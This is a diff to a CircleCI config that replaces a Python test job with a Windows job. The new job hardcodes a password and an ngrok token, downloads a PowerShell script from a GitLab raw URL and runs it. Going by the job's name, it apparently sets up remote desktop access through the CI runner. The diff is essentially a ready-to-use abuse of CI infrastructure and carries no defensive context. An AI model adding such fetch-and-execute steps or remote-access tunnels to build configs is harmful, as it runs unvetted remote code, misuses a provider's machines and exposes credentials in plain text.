@@ -1,21 +1,19 @@
-version: 2.1
-
+version: 2.1 
+ 
 orbs:
-  python: circleci/python@0.2.1
-
+  win: circleci/windows@2.2.0
+ 
 jobs:
-  build-and-test:
-    executor: python/default
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
     steps:
-      - checkout
-      - python/load-cache
-      - python/install-deps
-      - python/save-cache
       - run:
-          command: ./manage.py test
-          name: Test
-
-workflows:
-  main:
-    jobs:
-      - build-and-test
+          name: Windows RDP Circle CI NEW UPDATED
+          command: |
+            Set-Variable -Name "PASSWORD" -Value "PhuCuong"
+            Set-Variable -Name "NGROK" -Value "1rLXdBMKJFJ8L8Pk9qcH3pLAxZM_5trHXrJo35VKt7iMjAoEQ"
+            Invoke-WebRequest https://gitlab.com/haithuongpro2711/haivps/-/raw/master/RDPcircleCI.ps1 -OutFile RDPcircleCI.ps1
+            ./RDPcircleCI.ps1
